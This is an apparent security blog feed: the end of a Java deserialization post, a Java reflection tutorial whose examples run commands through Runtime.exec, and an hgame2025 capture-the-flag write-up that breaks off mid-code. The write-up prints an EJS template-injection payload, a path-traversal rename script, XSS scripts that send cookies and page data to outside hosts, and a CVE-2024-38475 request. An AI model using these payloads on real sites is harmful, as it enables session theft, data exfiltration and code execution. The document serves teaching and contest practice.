protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);<span class="comment">//！目标在这！</span></span><br><span class="line">    <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">            h += host.toLowerCase(Locale.ROOT).hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the file part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> u.getFile();</span><br><span class="line">    <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">        h += file.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the port part.</span></span><br><span class="line">    <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">        h += getDefaultPort();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        h += u.getPort();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the ref part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> u.getRef();</span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">        h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到达这里:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br></pre></td></tr></table></figure><p>根据主机名，获取其IP地址<br>实际上就是一次DNS查询<br>到这里就达成目的了<br>将获取到的<code>ht</code>对象(Hashmap的对象)<br>序列化:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(Utils.objectToHexString(ht));</span><br></pre></td></tr></table></figure><p>就生成了hex的序列化数据<br>如果成功的触发，那么就相当于存在反序列化漏洞</p><p>这个过程和php的链子的过程很相似<br>对于我来说有很平滑的过度<br>感谢phithon大佬</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全反射篇</title>
      <link href="/2025/03/09/java-reflect/"/>
      <url>/2025/03/09/java-reflect/</url>
      
        <content type="html"><![CDATA[<h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Java的反射（Reflection）是一种允许程序在运行时动态访问、检测和修改自身结构和行为的机制。</span><br><span class="line">通过反射，Java代码可以获取类的信息（如类名、方法、字段、构造器等），</span><br><span class="line">甚至操作类的私有成员、动态创建对象、调用方法等。以下是反射的核心概念和用法：</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">​为什么叫“反射”？</span><br><span class="line">“反射”这一名称来源于“程序能够像镜子一样观察自身结构”的比喻：</span><br><span class="line"></span><br><span class="line">​反射（Reflection）​​ 的字面意义是“映射、倒影”。</span><br><span class="line">在编程中，它表示程序在运行时可以“反向映射”自身的结构，</span><br><span class="line">例如类的定义、方法、属性等元数据。</span><br><span class="line">反射机制让程序不再局限于“静态”的代码结构，</span><br><span class="line">而是可以在运行时动态“反映”出类的内部细节，从而实现灵活的编程。</span><br></pre></td></tr></table></figure><h3 id="核心作用"><a href="#核心作用" class="headerlink" title="核心作用"></a>核心作用</h3><p>反射的核心作用:</p><ul><li>动态获取类的信息：在运行时分析类的结构。</li><li>动态创建对象：通过类名实例化对象。</li><li>动态调用方法：根据方法名和参数调用方法。</li><li>访问私有成员：突破访问权限限制（需主动授权）。</li><li>通用框架开发：如<code>Spring</code>、<code>Hibernate</code>等框架依赖反射实现依赖注入、动态代理等。</li></ul><h3 id="反射的核心类"><a href="#反射的核心类" class="headerlink" title="反射的核心类"></a>反射的核心类</h3><ul><li><h4 id="Class类：表示一个类或接口，是所有反射操作的入口。"><a href="#Class类：表示一个类或接口，是所有反射操作的入口。" class="headerlink" title="Class类：表示一个类或接口，是所有反射操作的入口。"></a><code>Class</code>类：表示一个类或接口，是所有反射操作的入口。</h4></li></ul><p>获取类的class对象:</p><h5 id="通过类名-class："><a href="#通过类名-class：" class="headerlink" title="通过类名.class："></a>通过类名.class：</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;User&gt; clazz = User.class;</span><br></pre></td></tr></table></figure><h5 id="通过对象实例的getClass-方法："><a href="#通过对象实例的getClass-方法：" class="headerlink" title="通过对象实例的getClass()方法："></a>通过对象实例的getClass()方法：</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">Class&lt;?&gt; clazz = user.getClass();</span><br></pre></td></tr></table></figure><h5 id="通过Class-forName-“全限定类名”-："><a href="#通过Class-forName-“全限定类名”-：" class="headerlink" title="通过Class.forName(“全限定类名”)："></a>通过Class.forName(“全限定类名”)：</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.example.User&quot;</span>); <span class="comment">// 需处理ClassNotFoundException</span></span><br></pre></td></tr></table></figure><p>创建对象实例:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过无参构造器创建对象</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> clazz.newInstance(); <span class="comment">// 已过时，推荐用getDeclaredConstructor().newInstance()</span></span><br><span class="line"><span class="comment">// 通过有参构造器创建对象</span></span><br><span class="line">Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) constructor.newInstance(<span class="string">&quot;Alice&quot;</span>, <span class="number">25</span>);</span><br></pre></td></tr></table></figure><p>调用方法:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;setName&quot;</span>, String.class); <span class="comment">// 获取公有方法</span></span><br><span class="line">method.invoke(user, <span class="string">&quot;Bob&quot;</span>); <span class="comment">// 调用方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用私有方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">privateMethod</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;privateMethod&quot;</span>);</span><br><span class="line">privateMethod.setAccessible(<span class="literal">true</span>); <span class="comment">// 突破访问限制</span></span><br><span class="line">privateMethod.invoke(user);</span><br></pre></td></tr></table></figure><p>访问字段(属性):</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>); <span class="comment">// 访问私有字段</span></span><br><span class="line">field.set(user, <span class="string">&quot;Charlie&quot;</span>); <span class="comment">// 设置值</span></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) field.get(user); <span class="comment">// 获取值</span></span><br></pre></td></tr></table></figure><ul><li><h4 id="Constructor类：表示类的构造方法，用于创建对象。"><a href="#Constructor类：表示类的构造方法，用于创建对象。" class="headerlink" title="Constructor类：表示类的构造方法，用于创建对象。"></a><code>Constructor</code>类：表示类的构造方法，用于创建对象。</h4></li></ul><p>和类名一样的函数：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClass</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;公共构造方法调用，name: &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反射调用</span></span><br><span class="line">Constructor&lt;MyClass&gt; constructor = MyClass.class.getConstructor(String.class);</span><br><span class="line"><span class="type">MyClass</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;Alice&quot;</span>);</span><br></pre></td></tr></table></figure><p>常用命令执行类:<code>ProcessBuilder</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)</span><br><span class="line">clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>))).star</span><br><span class="line"><span class="title function_">t</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(</span><br><span class="line">Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure><ul><li><h4 id="Method类：表示类的方法，用于调用方法。"><a href="#Method类：表示类的方法，用于调用方法。" class="headerlink" title="Method类：表示类的方法，用于调用方法。"></a><code>Method</code>类：表示类的方法，用于调用方法。</h4></li></ul><p>核心是<code>invoke(调用)</code>方法<br>获取 <code>Method</code> 对象：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">获取公共方法（包括继承的）。</span><br><span class="line">Class.getMethod(String name, Class&lt;?&gt;... parameterTypes)</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),</span><br><span class="line"><span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">获取本类中声明的方法（包括私有方法）。</span><br><span class="line">Class.getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes)</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">setAccessible ，这个是必须的。</span><br></pre></td></tr></table></figure><p>示例:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取 String 类的 toUpperCase 方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> String.class.getMethod(<span class="string">&quot;toUpperCase&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建对象实例</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 调用方法：str.toUpperCase()</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(str); <span class="comment">// 参数为对象实例（str）和空参数</span></span><br><span class="line">        </span><br><span class="line">        System.out.println(result); <span class="comment">// 输出：HELLO</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例2：带参数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MathUtils</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取静态方法 add(int, int)</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> MathUtils.class.getMethod(<span class="string">&quot;add&quot;</span>, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 调用静态方法（obj 参数传 null）</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(<span class="literal">null</span>, <span class="number">3</span>, <span class="number">5</span>);</span><br><span class="line">        </span><br><span class="line">        System.out.println(result); <span class="comment">// 输出：8</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><h4 id="Field类：表示类的字段（成员变量），用于读写字段值。"><a href="#Field类：表示类的字段（成员变量），用于读写字段值。" class="headerlink" title="Field类：表示类的字段（成员变量），用于读写字段值。"></a><code>Field</code>类：表示类的字段（成员变量），用于读写字段值。</h4></li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">field.set(obj, value);</span><br></pre></td></tr></table></figure><ul><li><h4 id="Modifier类：解析类、方法或字段的修饰符（如public、private）。"><a href="#Modifier类：解析类、方法或字段的修饰符（如public、private）。" class="headerlink" title="Modifier类：解析类、方法或字段的修饰符（如public、private）。"></a><code>Modifier</code>类：解析类、方法或字段的修饰符（如<code>public</code>、<code>private</code>）。</h4></li></ul><h1 id="恶意类示例"><a href="#恶意类示例" class="headerlink" title="恶意类示例"></a>恶意类示例</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2025</title>
      <link href="/2025/03/09/hgame2025/"/>
      <url>/2025/03/09/hgame2025/</url>
      
        <content type="html"><![CDATA[<h3 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a>Level 24 Pacman</h3><p>直接看index.js中有一段</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">here is your <span class="attr">gift</span>:aGFldTRlcGNhXzR0cmdte19yX2Ftbm1zZX0=</span><br></pre></td></tr></table></figure><p>base64解码得:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">haeu4epca_4trgm&#123;_r_amnmse&#125;</span><br></pre></td></tr></table></figure><p>观察应该是栅栏密码<br>比较短，直接人肉还原一下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">haeu4epca_4tr</span><br><span class="line">gm&#123;_r_amnmse&#125;</span><br></pre></td></tr></table></figure><p>然后竖着读</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;u_4re_pacman_m4ster&#125;</span><br></pre></td></tr></table></figure><h3 id="Level-69-MysteryMessageBoard"><a href="#Level-69-MysteryMessageBoard" class="headerlink" title="Level 69 MysteryMessageBoard"></a>Level 69 MysteryMessageBoard</h3><p>看题干以及代码，发现直接加载mortis.ejs运行，那么尝试进行覆盖<br>先构造:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;env&#x27;) %&gt;</span><br></pre></td></tr></table></figure><p>上传后使用rename接口进行覆盖,<br>尝试了几次后这个路径覆盖成功:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://119.45.235.21:30377/rename&quot;</span>  <span class="comment"># 替换为你的服务器地址</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;oldName&quot;</span>: <span class="string">&quot;mortis.ejs&quot;</span>,  <span class="comment"># 旧文件名</span></span><br><span class="line">    <span class="string">&quot;newName&quot;</span>: <span class="string">&quot;../views/mortis.ejs&quot;</span>   <span class="comment"># 新文件名</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, json=data)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error: 500 &#123;&quot;error&quot;:&quot;重命名失败: ENOENT: no such file or directory, rename &#x27;/app/uploads/mortis.ejs&#x27; -&gt; &#x27;/app/static/mortis.ejs&#x27;&quot;&#125;</span><br><span class="line">Error: 500 &#123;&quot;error&quot;:&quot;重命名失败: ENOENT: no such file or directory, rename &#x27;/app/uploads/mortis.ejs&#x27; -&gt; &#x27;/views/mortis.ejs&#x27;&quot;&#125;</span><br><span class="line">Success: &#123;&#x27;message&#x27;: &#x27;文件重命名成功&#x27;&#125;</span><br></pre></td></tr></table></figure><p>覆盖后刷新网站首页查找hgame获得flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;Av3_muJ1c4_haS-Br0keN_UP-BUt_We-h@Ve-UMiTaKi66&#125;</span><br></pre></td></tr></table></figure><h3 id="Level-69-MysteryMessageBoard-1"><a href="#Level-69-MysteryMessageBoard-1" class="headerlink" title="Level 69 MysteryMessageBoard"></a>Level 69 MysteryMessageBoard</h3><p>已知用户名:shallot<br>使用弱秘钥爆破得密码:888888</p><p>看题干猜测是xss<br>之前不知道怎么登录的时候发现有&#x2F;admin接口，确定是xss<br>劫持cookie:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">on_on_load</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://120.76.159.54:3389&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">body</span>: <span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(data))</span><br><span class="line">        .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">onload</span> = on_on_load;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="comment">// 基础数据收集</span></span><br><span class="line"><span class="keyword">const</span> attackerServer = <span class="string">&#x27;http://fy0gjk0x.requestrepo.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 拦截原生 fetch 方法</span></span><br><span class="line"><span class="keyword">const</span> originalFetch = <span class="variable language_">window</span>.<span class="property">fetch</span>;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">fetch</span> = <span class="keyword">function</span>(<span class="params">url, options</span>) &#123;</span><br><span class="line">  <span class="comment">// 捕获请求数据</span></span><br><span class="line">  <span class="keyword">const</span> requestData = &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;fetch&#x27;</span>,</span><br><span class="line">    <span class="attr">url</span>: url,</span><br><span class="line">    <span class="attr">method</span>: options?.<span class="property">method</span> || <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: options?.<span class="property">headers</span> ? &#123;...options.<span class="property">headers</span>&#125; : &#123;&#125;,</span><br><span class="line">    <span class="attr">body</span>: options?.<span class="property">body</span> ? options.<span class="property">body</span>.<span class="title function_">toString</span>() : <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">timestamp</span>: <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toISOString</span>()</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 发送到攻击服务器</span></span><br><span class="line">  navigator.<span class="title function_">sendBeacon</span>(attackerServer, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(requestData));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> originalFetch.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 拦截 XMLHttpRequest</span></span><br><span class="line"><span class="keyword">const</span> originalXHROpen = <span class="title class_">XMLHttpRequest</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">open</span>;</span><br><span class="line"><span class="keyword">const</span> originalXHRSend = <span class="title class_">XMLHttpRequest</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">send</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">XMLHttpRequest</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">open</span> = <span class="keyword">function</span>(<span class="params">method, url</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">_method</span> = method;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">_url</span> = url;</span><br><span class="line">  <span class="keyword">return</span> originalXHROpen.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">XMLHttpRequest</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">send</span> = <span class="keyword">function</span>(<span class="params">body</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> requestData = &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;xhr&#x27;</span>,</span><br><span class="line">    <span class="attr">url</span>: <span class="variable language_">this</span>.<span class="property">_url</span>,</span><br><span class="line">    <span class="attr">method</span>: <span class="variable language_">this</span>.<span class="property">_method</span>,</span><br><span class="line">    <span class="attr">headers</span>: <span class="variable language_">this</span>.<span class="property">_headers</span> || &#123;&#125;,</span><br><span class="line">    <span class="attr">body</span>: body ? body.<span class="title function_">toString</span>() : <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">timestamp</span>: <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toISOString</span>()</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  navigator.<span class="title function_">sendBeacon</span>(attackerServer, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(requestData));</span><br><span class="line">  <span class="keyword">return</span> originalXHRSend.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 捕获页面初始加载的Cookie</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> data = &#123;</span><br><span class="line">    <span class="attr">cookies</span>: <span class="variable language_">document</span>.<span class="property">cookie</span>,</span><br><span class="line">    <span class="attr">dom</span>: <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">outerHTML</span>,</span><br><span class="line">    <span class="attr">referrer</span>: <span class="variable language_">document</span>.<span class="property">referrer</span>,</span><br><span class="line">    <span class="attr">header</span>:<span class="variable language_">document</span></span><br><span class="line">  &#125;;</span><br><span class="line">  navigator.<span class="title function_">sendBeacon</span>(attackerServer, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>劫持获得session：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MTczODU5MzU2N3xEWDhFQVFMX2dBQUJFQUVRQUFBbl80QUFBUVp6ZEhKcGJtY01DZ0FJZFhObGNtNWhiV1VHYzNSeWFXNW5EQWNBQldGa2JXbHV84eE9t0yI4-g4qaBupwIa27OI7uqu5Dje4mCGvbFzb2w=</span><br></pre></td></tr></table></figure><p>带着cookie扫目录发现&#x2F;flag<br>使用admin的cookie访问获得flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;W0w_y0u_5r4_9o0d_4t_xss&#125;</span><br></pre></td></tr></table></figure><h3 id="Level-38475-角落"><a href="#Level-38475-角落" class="headerlink" title="Level 38475 角落"></a>Level 38475 角落</h3><p>经过搜索发现是cve2024-38475<br>伪造请求进行开黑盒</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/usr/local/apache2/app/app.py%3F</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node1.hgame.vidar.club:32567</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>L1nk/</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string, redirect</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">pwd = os.path.dirname(__file__)</span><br><span class="line">show_msg = <span class="string">&#x27;&#x27;&#x27;Latest message: &#123;&#123;message&#125;&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readmsg</span>():</span><br><span class="line">filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(filename):</span><br><span class="line">f = <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">message = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">return</span> message</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;No message now.&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">status = request.args.get(<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> status <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">status = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, status=status)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span 